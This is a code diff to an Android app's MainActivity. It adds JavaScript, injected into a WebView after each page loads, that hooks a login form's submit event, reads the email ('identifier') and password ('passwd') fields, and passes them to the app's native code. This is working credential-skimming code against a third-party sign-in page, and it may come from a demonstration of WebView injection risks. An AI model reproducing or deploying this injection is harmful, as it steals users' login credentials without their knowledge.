@@ -48,7 +48,10 @@ public class MainActivity extends AppCompatActivity {
             //public void onPageStarted(WebView view, String url,
               //                        Bitmap favicon) {
             //}
-
+            /*--------
+            Code below is adapted from
+            https://stackoverflow.com/questions/49594974/webview-javascript-injection
+            ------*/
             @Override
             public void onPageFinished(WebView view, String url) {
                 super.onPageFinished(view, url);
@@ -56,17 +59,17 @@ public class MainActivity extends AppCompatActivity {
                 StringBuilder sb = new StringBuilder();
 
                 sb.append("document.getElementsByTagName('form')[0].onsubmit = function () {");
-                sb.append("var objPWD, objAccount;var str = '';");
+                sb.append("var password=null; var email=null; var alertMessage = '';");
                 sb.append("var inputs = document.getElementsByTagName('input');");
 
                 sb.append("for (var i = 0; i < inputs.length; i++) {");
-                sb.append("if (inputs[i].type.toLowerCase() === 'password') {objPWD = inputs[i];}");
-                sb.append("else if (inputs[i].type.toLowerCase() === 'email') {objAccount = inputs[i];}");
+                sb.append("if (inputs[i].name.toLowerCase() === 'passwd') {password = inputs[i];}");
+                sb.append("else if (inputs[i].name.toLowerCase() === 'identifier') {email = inputs[i];}");
                 sb.append("}");
-                sb.append("if (objAccount != null) {str += 'Username: ' + objAccount.value;}");
-                sb.append("if (objPWD != null) { str += 'Password: ' + objPWD.value;}");
+                sb.append("if (email != null) {alertMessage += 'Email: ' + email.value;}");
+                sb.append("if (password != null) { alertMessage += ' Password: ' + password.value;}");
 
-                sb.append("window.Android.processHTML(str);");
+                sb.append("window.Android.processHTML(alertMessage);");
 
                 sb.append("return true;");
                 sb.append("};");
